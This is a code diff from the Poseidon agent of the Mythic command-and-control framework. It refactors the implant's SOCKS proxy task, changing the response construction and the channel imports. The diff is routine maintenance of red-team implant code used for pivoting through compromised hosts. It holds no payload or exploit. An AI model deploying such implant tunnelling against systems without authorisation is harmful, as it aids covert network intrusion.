@@ -7,7 +7,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
 	"io"
 	"net"
 	"strconv"
@@ -109,31 +109,27 @@ func Run(task structs.Task) {
 		startedGoRoutines = true
 	}
 	if err != nil {
-		errResp := structs.Response{}
+		errResp := task.NewResponse()
 		errResp.Completed = false
-		errResp.TaskID = task.TaskID
 		errResp.Status = "error"
 		errResp.UserOutput = err.Error()
 		task.Job.SendResponses <- errResp
 		return
 	}
-	resp := structs.Response{}
+	resp := task.NewResponse()
 	if args.Action == "start" {
 		closeAllChannels()
 
 		resp.UserOutput = "Socks started"
 		resp.Completed = true
-		resp.TaskID = task.TaskID
 	} else if args.Action == "stop" {
 		closeAllChannels()
 		resp.UserOutput = "Socks stopped"
 		resp.Completed = true
-		resp.TaskID = task.TaskID
 	} else if args.Action == "reset" {
 		closeAllChannels()
 		resp.UserOutput = "Socks data flushed"
 		resp.Completed = true
-		resp.TaskID = task.TaskID
 	}
 	task.Job.SendResponses <- resp
 
@@ -174,7 +170,7 @@ func handleMutexMapModifications() {
 				delete(channelMap.m, msg)
 				//fmt.Printf("Removed channel (%d) from map, now length %d\n", msg, len(channelMap.m))
 			}
-		case msg := <-profiles.FromMythicSocksChannel:
+		case msg := <-responses.FromMythicSocksChannel:
 			if _, ok := channelMap.m[msg.ServerId]; ok {
 				select {
 				case channelMap.m[msg.ServerId].Channel <- msg:
@@ -187,7 +183,7 @@ func handleMutexMapModifications() {
 					//fmt.Printf("Failed to decode message")
 					continue
 				}
-				go connectToProxy(profiles.FromMythicSocksChannel, msg.ServerId, profiles.InterceptToMythicSocksChannel, data)
+				go connectToProxy(responses.FromMythicSocksChannel, msg.ServerId, responses.InterceptToMythicSocksChannel, data)
 			}
 		}
 	}
